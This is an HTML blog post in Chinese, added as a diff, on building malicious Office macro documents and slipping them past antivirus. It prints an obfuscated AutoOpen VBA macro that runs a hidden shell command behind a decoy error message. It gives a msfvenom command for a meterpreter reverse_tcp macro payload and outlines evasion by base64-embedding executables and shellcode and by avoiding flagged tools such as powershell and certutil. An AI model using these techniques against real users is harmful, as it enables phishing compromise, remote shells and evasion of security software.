@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>恶意宏文档与免杀</title>
+</head>
+<body>
+  <header class="texture-black">
+    <div class="container"><div class="navbar">
+	<ul>
+		<a href="/index"><li>Home</li></a>
+		<a href="/about"><li>About</li></a>
+		<a href="/archive"><li>Archive</li></a>
+	</ul>
+</div></div><div class="container">
+	<h1>恶意宏文档与免杀</h1>
+	<h4 class="post-description"></h4>
+	<div class="post-date" style="margin-top:20px">
+		Published on Dec 3, 2019
+	</div>
+	<ul class="post-tags"><li>apt</li></ul>
+</div>
+</header>
+  <main>
+    <div class="container">
+      <div class="post-container">
+          <h1 id="生成执行cmd的宏">生成执行cmd的宏</h1>
+
+<p>项目地址 https://github.com/metac0rtex/Office-Macro-Generator</p>
+
+<p>生成示例:</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Public</span> <span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
+  <span class="k">Dim</span> <span class="nv">cmd</span> <span class="ow">As</span> <span class="kt">String</span>
+  <span class="n">BxJnb</span> <span class="o">=</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">112</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">68</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">58</span><span class="p">)</span>
+  <span class="n">SAnJV</span> <span class="o">=</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span>
+  <span class="n">JKkJK</span> <span class="o">=</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">ChrW</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span>
+  <span class="n">cmd</span> <span class="o">=</span> <span class="n">BxJnb</span> <span class="o">&amp;</span> <span class="n">SAnJV</span> <span class="o">&amp;</span> <span class="n">JKkJK</span>
+  <span class="k">Dim</span> <span class="nv">Obj</span> <span class="n">as</span> <span class="kt">Object</span>
+  <span class="k">Set</span> <span class="n">Obj</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
+  <span class="n">Obj</span><span class="p">.</span><span class="n">Run</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span>
+  <span class="n">MsgBox</span> <span class="p">(</span><span class="s">"Required rescource could not be allocated"</span><span class="p">)</span>
+<span class="k">End</span> <span class="k">Sub</span>
+  <span class="n">cmd</span> <span class="o">=</span> <span class="n">cmd</span> <span class="o">&amp;</span> <span class="s">"cscript D:\test111.vbs"</span>
+</code></pre></div></div>
+
+<p>主要就是使用ChrW()拼接成cmd，然后通过调用WScript.Shell执行命令</p>
+
+<p>类似项目：</p>
+
+<p>https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</p>
+
+<p>https://github.com/infosecn1nja/MaliciousMacroMSBuild</p>
+
+<h1 id="使用msf生成宏">使用msf生成宏</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f vba -o try.vba
+</code></pre></div></div>
+
+<p>使用msf生成vba代码，放入word中即可。</p>
+
+<p>msf生成的宏使用shellcode动态加载技术，运行时在内存中注入shellcode并执行</p>
+
+<h1 id="免杀">免杀</h1>
+
+<p>灵活运用base64就可以达到免杀的效果，此处只讲解原理并提供思路。</p>
+
+<h2 id="cmd宏的免杀">cmd宏的免杀</h2>
+
+<p>执行cmd本身不会引起杀软的注意，但是当进行敏感操作时杀软就会警告（如调用powershell、cscript、wscript、bitsadmin、certutil等），因此执行命令时应该避开调用这些程序。</p>
+
+<p>以火绒为例:</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/20191203141834.png" alt="火绒" /></p>
+
+<p>思路：</p>
+
+<p>将免杀的exe进行base64编码写入代码中，当宏执行时释放exe并运行。</p>
+
+<h2 id="基于动态加载shellcode的宏的免杀">基于动态加载shellcode的宏的免杀</h2>
+
+<p>最开始尝试直接使用veil混淆过的shellcode进行免杀，但是并没有达到效果。</p>
+
+<p>https://payloads.online/archivers/2019-05-16/1 倾旋在博客中提过将shellcode通过自增等操作进行混淆。</p>
+
+<p>根据这个思路，我们可以将shellcode进行base64编码，运行的时候再将编码后的shellcode还原。</p>
+
+<h2 id="思路拓展">思路拓展</h2>
+
+<p>base64编码本质上是一种加密过程，将payload视为明文，通过编码的得到密文，在程序运行时再讲密文还原为明文，以此来绕过杀软的静态检测。如果可以自己实现一种加密方式，就可以达到很好的免杀效果。</p>
+
+      </div>
+
+        <!-- Configure Disqus --></div>
+  </main></body>
+</html>
